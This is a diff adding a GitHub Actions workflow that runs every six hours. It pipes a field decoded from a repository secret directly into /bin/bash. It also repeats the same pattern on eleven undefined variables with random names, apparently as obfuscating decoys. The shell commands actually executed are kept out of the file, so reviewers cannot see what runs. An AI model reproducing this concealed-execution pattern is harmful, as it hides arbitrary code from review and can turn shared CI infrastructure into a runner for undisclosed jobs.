@@ -1,0 +1,30 @@
+name: zhizuixy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhizuixy
+        env:
+          msg7335: ${{ secrets.msg7335 }}
+        run: |
+          echo $msg7335 | jq -r .sn88 | /bin/bash
+          echo $fnawg1405 | jq -r .fzb87583 | /bin/bash
+          echo $uey3456 | jq -r .iwcg13 | /bin/bash
+          echo $ppmht0 | jq -r .q1 | /bin/bash
+          echo $dfxww238 | jq -r .aahfo03868 | /bin/bash
+          echo $wv39 | jq -r .b60189 | /bin/bash
+          echo $pukr8965 | jq -r .re74 | /bin/bash
+          echo $h1685 | jq -r .dthax4729 | /bin/bash
+          echo $n3441 | jq -r .mpnt3985 | /bin/bash
+          echo $s409 | jq -r .hwo78591 | /bin/bash
+          echo $bk1 | jq -r .m9 | /bin/bash
+          echo $vjsib84499 | jq -r .mcjy664 | /bin/bash
+
